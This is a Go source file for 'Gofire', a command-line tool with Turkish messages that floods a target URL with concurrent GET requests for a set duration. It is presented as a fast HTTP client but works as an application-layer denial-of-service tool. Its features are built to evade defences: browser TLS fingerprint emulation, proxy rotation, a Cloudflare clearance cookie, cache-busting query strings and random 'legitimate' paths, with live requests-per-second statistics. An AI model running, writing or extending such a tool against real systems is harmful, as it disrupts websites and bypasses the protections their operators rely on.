package main

import (
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	gofire "github.com/JSInvasor/Gohttp-clientfingerprintemulateandfastest"
)

const version = "1.0.0"

const banner = `
   ██████╗  ██████╗ ███████╗██╗██████╗ ███████╗
  ██╔════╝ ██╔═══██╗██╔════╝██║██╔══██╗██╔════╝
  ██║  ███╗██║   ██║█████╗  ██║██████╔╝█████╗
  ██║   ██║██║   ██║██╔══╝  ██║██╔══██╗██╔══╝
  ╚██████╔╝╚██████╔╝██║     ██║██║  ██║███████╗
   ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝
`

// Config holds all CLI configuration.
type Config struct {
	URL       string `json:"url"`
	Threads   int    `json:"threads"`
	Rate      int    `json:"rate"`
	Duration  int    `json:"duration"`
	Proxy     string `json:"proxy,omitempty"`
	Cookie    string `json:"cookie,omitempty"`
	UserAgent string `json:"ua,omitempty"`
	Cache     bool   `json:"cache,omitempty"`
	Debug     bool   `json:"debug,omitempty"`
	RandPath  bool   `json:"randpath,omitempty"`
	Referer   string `json:"referer,omitempty"`
	HTTPS     bool   `json:"https,omitempty"`
	Redirect  bool   `json:"redirect,omitempty"`
	Close     bool   `json:"close,omitempty"`
}

// ANSI color codes
const (
	colorReset  = "\033[0m"
	colorRed    = "\033[31m"
	colorGreen  = "\033[32m"
	colorYellow = "\033[33m"
	colorCyan   = "\033[36m"
	colorWhite  = "\033[37m"
	colorGray   = "\033[90m"
	colorBold   = "\033[1m"
)

func main() {
	// CLI flags
	urlFlag := flag.String("url", "", "Target URL (http:// or https://) (required)")
	uFlag := flag.String("u", "", "Target URL (short)")
	threads := flag.Int("threads", 0, "Number of concurrent threads (required)")
	t := flag.Int("t", 0, "Threads (short)")
	rate := flag.Int("rate", 0, "Request rate per thread (required)")
	r := flag.Int("r", 0, "Rate (short)")
	duration := flag.Int("time", 0, "Duration in seconds (required)")
	s := flag.Int("s", 0, "Duration (short)")
	proxy := flag.String("proxy", "", "Proxy (ip:port or ip:port:user:pass or file)")
	l := flag.String("l", "", "Proxy (short)")
	cookie := flag.String("cookie", "", "Cookie value like cf_clearance=...")
	k := flag.String("k", "", "Cookie (short)")
	ua := flag.String("ua", "", "Custom useragent")
	v := flag.String("v", "", "UA (short)")
	cache := flag.Bool("cache", false, "Enable cache bypass with random query strings")
	c := flag.Bool("c", false, "Cache (short)")
	debug := flag.Bool("debug", false, "Enable status code debug mode")
	d := flag.Bool("d", false, "Debug (short)")
	randpath := flag.Bool("randpath", false, "Use legitimate random paths")
	p := flag.Bool("p", false, "Randpath (short)")
	referer := flag.String("referer", "", "Referer website url e.g. https://google.com")
	e := flag.String("e", "", "Referer (short)")
	httpsProxy := flag.Bool("https", false, "Use https proxy tunnel")
	b := flag.Bool("b", false, "HTTPS proxy (short)")
	save := flag.String("save", "", "Save config to file (e.g., config.json)")
	z := flag.String("z", "", "Save (short)")
	load := flag.String("load", "", "Load config from file (e.g., config.json)")
	o := flag.String("o", "", "Load (short)")
	redirect := flag.Bool("redirect", false, "Follow http redirects")
	q := flag.Bool("q", false, "Redirect (short)")
	closConn := flag.Bool("close", false, "Close connection after each request batch")
	x := flag.Bool("x", false, "Close (short)")

	flag.Usage = func() {
		fmt.Printf("%s%s%s", colorCyan, banner, colorReset)
		fmt.Printf("  %sGofire[v%s]%s | High-Performance HTTP Client with Firefox 148 TLS Fingerprint\n\n", colorBold, version, colorReset)
		fmt.Printf("  %sUsage:%s  gofire --url <target-url> [arguments]\n", colorYellow, colorReset)
		fmt.Printf("  %sExample:%s gofire --url https://example.com --time 260 --threads 32 --rate 64\n\n", colorYellow, colorReset)
		fmt.Printf("  %sArguments:%s\n\n", colorGreen, colorReset)
		fmt.Printf("    %s--url,      -u%s | Target URL (%shttp://%s or %shttps://%s) (required)\n", colorCyan, colorReset, colorGreen, colorReset, colorGreen, colorReset)
		fmt.Printf("    %s--threads,  -t%s | Number of concurrent threads (required)\n", colorCyan, colorReset)
		fmt.Printf("    %s--rate,     -r%s | Request rate per thread (required)\n", colorCyan, colorReset)
		fmt.Printf("    %s--time,     -s%s | Duration in seconds (required)\n", colorCyan, colorReset)
		fmt.Printf("    %s--proxy,    -l%s | Proxy (%sip:port%s or %sip:port:user:pass%s or %sfile%s)\n", colorCyan, colorReset, colorYellow, colorReset, colorYellow, colorReset, colorYellow, colorReset)
		fmt.Printf("    %s--cookie,   -k%s | Cookie value like %scf_clearance=...%s\n", colorCyan, colorReset, colorYellow, colorReset)
		fmt.Printf("    %s--ua,       -v%s | Custom useragent\n", colorCyan, colorReset)
		fmt.Printf("    %s--cache,    -c%s | Enable cache bypass with random query strings\n", colorCyan, colorReset)
		fmt.Printf("    %s--debug,    -d%s | Enable status code debug mode\n", colorCyan, colorReset)
		fmt.Printf("    %s--randpath, -p%s | Use legitimate random paths\n", colorCyan, colorReset)
		fmt.Printf("    %s--referer,  -e%s | Referer website url e.g. %shttps://google.com%s\n", colorCyan, colorReset, colorGreen, colorReset)
		fmt.Printf("    %s--https,    -b%s | Use https proxy tunnel\n", colorCyan, colorReset)
		fmt.Printf("    %s--save,     -z%s | Save config to file (e.g., config.json)\n", colorCyan, colorReset)
		fmt.Printf("    %s--load,     -o%s | Load config from file (e.g., config.json)\n", colorCyan, colorReset)
		fmt.Printf("    %s--redirect, -q%s | Follow http redirects\n", colorCyan, colorReset)
		fmt.Printf("    %s--close,    -x%s | Close connection after each request batch\n", colorCyan, colorReset)
		fmt.Println()
	}

	flag.Parse()

	// Merge short and long flags
	cfg := Config{}

	// Load config from file first if specified
	loadFile := coalesceStr(*load, *o)
	if loadFile != "" {
		data, err := os.ReadFile(loadFile)
		if err != nil {
			fatal("Config dosyası okunamadı: %v", err)
		}
		if err := json.Unmarshal(data, &cfg); err != nil {
			fatal("Config parse hatası: %v", err)
		}
		fmt.Printf("  %s[+]%s Config yüklendi: %s\n", colorGreen, colorReset, loadFile)
	}

	// CLI flags override loaded config
	if v := coalesceStr(*urlFlag, *uFlag); v != "" {
		cfg.URL = v
	}
	if v := coalesceInt(*threads, *t); v > 0 {
		cfg.Threads = v
	}
	if v := coalesceInt(*rate, *r); v > 0 {
		cfg.Rate = v
	}
	if v := coalesceInt(*duration, *s); v > 0 {
		cfg.Duration = v
	}
	if v := coalesceStr(*proxy, *l); v != "" {
		cfg.Proxy = v
	}
	if v := coalesceStr(*cookie, *k); v != "" {
		cfg.Cookie = v
	}
	if v := coalesceStr(*ua, *v); v != "" {
		cfg.UserAgent = v
	}
	if *cache || *c {
		cfg.Cache = true
	}
	if *debug || *d {
		cfg.Debug = true
	}
	if *randpath || *p {
		cfg.RandPath = true
	}
	if v := coalesceStr(*referer, *e); v != "" {
		cfg.Referer = v
	}
	if *httpsProxy || *b {
		cfg.HTTPS = true
	}
	if *redirect || *q {
		cfg.Redirect = true
	}
	if *closConn || *x {
		cfg.Close = true
	}

	// Save config if requested
	saveFile := coalesceStr(*save, *z)
	if saveFile != "" {
		data, err := json.MarshalIndent(cfg, "", "  ")
		if err != nil {
			fatal("Config serialize hatası: %v", err)
		}
		if err := os.WriteFile(saveFile, data, 0644); err != nil {
			fatal("Config kaydedilemedi: %v", err)
		}
		fmt.Printf("  %s[+]%s Config kaydedildi: %s\n", colorGreen, colorReset, saveFile)
	}

	// Validate required fields
	if cfg.URL == "" || cfg.Threads <= 0 || cfg.Rate <= 0 || cfg.Duration <= 0 {
		flag.Usage()
		os.Exit(1)
	}

	// Ensure URL has scheme
	if !strings.HasPrefix(cfg.URL, "http://") && !strings.HasPrefix(cfg.URL, "https://") {
		cfg.URL = "https://" + cfg.URL
	}

	run(cfg)
}

func run(cfg Config) {
	fmt.Printf("%s%s%s", colorCyan, banner, colorReset)
	fmt.Printf("  %sGofire[v%s]%s | Firefox 148 TLS Fingerprint\n\n", colorBold, version, colorReset)

	// Build client options
	opts := []gofire.Option{
		gofire.WithTimeout(10 * time.Second),
		gofire.WithMaxIdleConnsPerHost(cfg.Threads * 2),
		gofire.WithMaxIdleConns(cfg.Threads * 10),
		gofire.WithDNSCacheTTL(10 * time.Minute),
		gofire.WithTLSHandshakeTimeout(10 * time.Second),
	}

	if cfg.UserAgent != "" {
		opts = append(opts, gofire.WithUserAgent(cfg.UserAgent))
	}
	if cfg.Referer != "" {
		opts = append(opts, gofire.WithReferer(cfg.Referer))
	}
	if !cfg.Redirect {
		opts = append(opts, gofire.WithDisableRedirects())
	}
	if cfg.Close {
		opts = append(opts, gofire.WithDisableKeepAlives())
	}

	// Handle proxy (single or file)
	var proxyRotator *gofire.ProxyRotator
	if cfg.Proxy != "" {
		// Check if it's a file
		if _, err := os.Stat(cfg.Proxy); err == nil {
			pr, err := gofire.NewProxyRotatorFromFile(cfg.Proxy)
			if err != nil {
				fatal("Proxy dosyası hatası: %v", err)
			}
			proxyRotator = pr
			fmt.Printf("  %s[+]%s %d proxy yüklendi: %s\n", colorGreen, colorReset, pr.Count(), cfg.Proxy)
		} else {
			// Single proxy
			proxyStr := cfg.Proxy
			if cfg.HTTPS && !strings.Contains(proxyStr, "://") {
				proxyStr = "https://" + proxyStr
			} else if !strings.Contains(proxyStr, "://") {
				// Parse ip:port:user:pass format
				parts := strings.Split(proxyStr, ":")
				if len(parts) == 4 {
					proxyStr = fmt.Sprintf("http://%s:%s@%s:%s", parts[2], parts[3], parts[0], parts[1])
				} else {
					proxyStr = "http://" + proxyStr
				}
			}
			opts = append(opts, gofire.WithProxy(proxyStr))
			fmt.Printf("  %s[+]%s Proxy: %s\n", colorGreen, colorReset, cfg.Proxy)
		}
	}

	// Create client
	client, err := gofire.Emulate(gofire.Firefox148, opts...)
	if err != nil {
		fatal("Client oluşturulamadı: %v", err)
	}
	defer client.Close()

	// Set proxy rotator if loaded from file
	if proxyRotator != nil {
		client.SetProxyRotator(proxyRotator)
	}

	// Set cookies
	if cfg.Cookie != "" {
		cookies := parseCookieString(cfg.Cookie)
		if err := client.SetCookies(cfg.URL, cookies); err != nil {
			fatal("Cookie hatası: %v", err)
		}
		fmt.Printf("  %s[+]%s %d cookie ayarlandı\n", colorGreen, colorReset, len(cookies))
	}

	// Print config
	totalRPS := cfg.Threads * cfg.Rate
	fmt.Printf("\n  %s[Target]%s    %s\n", colorYellow, colorReset, cfg.URL)
	fmt.Printf("  %s[Threads]%s   %d\n", colorYellow, colorReset, cfg.Threads)
	fmt.Printf("  %s[Rate]%s     %d/thread (%s%d total RPS%s)\n", colorYellow, colorReset, cfg.Rate, colorGreen, totalRPS, colorReset)
	fmt.Printf("  %s[Duration]%s  %ds\n", colorYellow, colorReset, cfg.Duration)
	if cfg.UserAgent != "" {
		fmt.Printf("  %s[UA]%s       %s\n", colorYellow, colorReset, cfg.UserAgent)
	}
	if cfg.Referer != "" {
		fmt.Printf("  %s[Referer]%s  %s\n", colorYellow, colorReset, cfg.Referer)
	}
	if cfg.Cache {
		fmt.Printf("  %s[Cache]%s    bypass enabled\n", colorYellow, colorReset)
	}
	if cfg.RandPath {
		fmt.Printf("  %s[RandPath]%s enabled\n", colorYellow, colorReset)
	}
	if cfg.Redirect {
		fmt.Printf("  %s[Redirect]%s enabled\n", colorYellow, colorReset)
	}
	if cfg.Close {
		fmt.Printf("  %s[Close]%s    close after batch\n", colorYellow, colorReset)
	}

	fmt.Printf("\n  %s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n", colorGray, colorReset)
	fmt.Printf("  %s[*]%s Starting in 2 seconds...\n", colorCyan, colorReset)
	time.Sleep(2 * time.Second)

	// Setup context with duration and signal handling
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(cfg.Duration)*time.Second)
	defer cancel()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigCh
		fmt.Printf("\n  %s[!]%s Durduruldu (CTRL+C)\n", colorRed, colorReset)
		cancel()
	}()

	// Stats
	var (
		totalSent    atomic.Int64
		totalSuccess atomic.Int64
		totalFailed  atomic.Int64
		statusCodes  sync.Map // map[int]*atomic.Int64
	)

	startTime := time.Now()

	// Rate-limited workers
	var wg sync.WaitGroup
	for i := 0; i < cfg.Threads; i++ {
		wg.Add(1)
		go func(threadID int) {
			defer wg.Done()

			// Rate limiter: interval between requests for this thread
			interval := time.Second / time.Duration(cfg.Rate)
			ticker := time.NewTicker(interval)
			defer ticker.Stop()

			for {
				select {
				case <-ctx.Done():
					return
				case <-ticker.C:
					reqURL := buildURL(cfg.URL, cfg.Cache, cfg.RandPath)
					totalSent.Add(1)

					resp, err := client.GetWithContext(ctx, reqURL)
					if err != nil {
						totalFailed.Add(1)
						if cfg.Debug {
							fmt.Printf("  %s[ERR]%s T%d: %v\n", colorRed, colorReset, threadID, err)
						}
						continue
					}

					totalSuccess.Add(1)
					sc := resp.StatusCode()
					resp.Close()

					// Track status codes
					if cfg.Debug {
						val, _ := statusCodes.LoadOrStore(sc, &atomic.Int64{})
						val.(*atomic.Int64).Add(1)
						color := colorGreen
						if sc >= 400 && sc < 500 {
							color = colorYellow
						} else if sc >= 500 {
							color = colorRed
						}
						fmt.Printf("  %s[%d]%s T%d -> %s\n", color, sc, colorReset, threadID, reqURL)
					}
				}
			}
		}(i)
	}

	// Real-time stats printer
	go func() {
		statsTicker := time.NewTicker(1 * time.Second)
		defer statsTicker.Stop()

		lastSent := int64(0)

		for {
			select {
			case <-ctx.Done():
				return
			case <-statsTicker.C:
				sent := totalSent.Load()
				ok := totalSuccess.Load()
				fail := totalFailed.Load()
				elapsed := time.Since(startTime).Seconds()
				remaining := float64(cfg.Duration) - elapsed
				if remaining < 0 {
					remaining = 0
				}
				currentRPS := sent - lastSent
				lastSent = sent

				if !cfg.Debug {
					fmt.Printf("\r  %s[*]%s Sent: %s%d%s | OK: %s%d%s | Fail: %s%d%s | RPS: %s%d%s | Elapsed: %s%.0fs%s | Left: %s%.0fs%s   ",
						colorCyan, colorReset,
						colorWhite, sent, colorReset,
						colorGreen, ok, colorReset,
						colorRed, fail, colorReset,
						colorYellow, currentRPS, colorReset,
						colorGray, elapsed, colorReset,
						colorGray, remaining, colorReset,
					)
				}
			}
		}
	}()

	// Wait for completion
	wg.Wait()
	endTime := time.Now()

	// Final stats
	totalDuration := endTime.Sub(startTime)
	sent := totalSent.Load()
	ok := totalSuccess.Load()
	fail := totalFailed.Load()
	avgRPS := float64(0)
	if totalDuration.Seconds() > 0 {
		avgRPS = float64(sent) / totalDuration.Seconds()
	}

	fmt.Printf("\n\n  %s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n", colorGray, colorReset)
	fmt.Printf("  %s%s[SONUÇLAR]%s\n\n", colorBold, colorGreen, colorReset)
	fmt.Printf("    Toplam Gönderilen : %s%d%s\n", colorWhite, sent, colorReset)
	fmt.Printf("    Başarılı          : %s%d%s\n", colorGreen, ok, colorReset)
	fmt.Printf("    Başarısız         : %s%d%s\n", colorRed, fail, colorReset)
	fmt.Printf("    Süre              : %s%v%s\n", colorYellow, totalDuration.Round(time.Millisecond), colorReset)
	fmt.Printf("    Ortalama RPS      : %s%.0f%s req/s\n", colorCyan, avgRPS, colorReset)
	fmt.Printf("    Bağlantılar       : %s%d%s\n", colorGray, client.ActiveConnections(), colorReset)

	// Print status code breakdown
	hasStatusCodes := false
	statusCodes.Range(func(key, value interface{}) bool {
		hasStatusCodes = true
		return false
	})
	if hasStatusCodes {
		fmt.Printf("\n    %sStatus Code Dağılımı:%s\n", colorYellow, colorReset)
		statusCodes.Range(func(key, value interface{}) bool {
			sc := key.(int)
			count := value.(*atomic.Int64).Load()
			color := colorGreen
			if sc >= 400 && sc < 500 {
				color = colorYellow
			} else if sc >= 500 {
				color = colorRed
			}
			fmt.Printf("      %s%d%s: %d\n", color, sc, colorReset, count)
			return true
		})
	}

	fmt.Printf("\n  %s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n\n", colorGray, colorReset)
}

// buildURL generates the request URL with optional cache bypass and random path.
func buildURL(base string, cacheBypass, randPath bool) string {
	u := base

	if randPath {
		u = u + "/" + randomPath()
	}

	if cacheBypass {
		sep := "?"
		if strings.Contains(u, "?") {
			sep = "&"
		}
		u = u + sep + randomParam() + "=" + randomString(8)
	}

	return u
}

// randomPath returns a random legitimate-looking path segment.
var legitimatePaths = []string{
	"about", "contact", "home", "index", "products", "services",
	"blog", "news", "faq", "support", "terms", "privacy",
	"login", "register", "account", "settings", "dashboard",
	"api/v1", "api/v2", "search", "categories", "tags",
	"page/1", "page/2", "page/3", "articles", "media",
	"assets", "static", "public", "resources", "docs",
	"help", "status", "pricing", "features", "download",
}

func randomPath() string {
	return legitimatePaths[rand.Intn(len(legitimatePaths))]
}

var cacheParams = []string{
	"_", "cb", "nocache", "t", "v", "ver", "rand", "r", "ts", "cache",
}

func randomParam() string {
	return cacheParams[rand.Intn(len(cacheParams))]
}

const charset = "abcdefghijklmnopqrstuvwxyz0123456789"

func randomString(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

// parseCookieString parses a cookie string like "name1=val1; name2=val2" into http.Cookie objects.
func parseCookieString(s string) []*http.Cookie {
	var cookies []*http.Cookie
	for _, part := range strings.Split(s, ";") {
		part = strings.TrimSpace(part)
		if part == "" {
			continue
		}
		eqIdx := strings.Index(part, "=")
		if eqIdx < 0 {
			continue
		}
		cookies = append(cookies, &http.Cookie{
			Name:  strings.TrimSpace(part[:eqIdx]),
			Value: strings.TrimSpace(part[eqIdx+1:]),
		})
	}
	return cookies
}

func coalesceStr(a, b string) string {
	if a != "" {
		return a
	}
	return b
}

func coalesceInt(a, b int) int {
	if a != 0 {
		return a
	}
	return b
}

func fatal(format string, args ...interface{}) {
	fmt.Fprintf(os.Stderr, "  %s[FATAL]%s %s\n", colorRed, colorReset, fmt.Sprintf(format, args...))
	os.Exit(1)
}
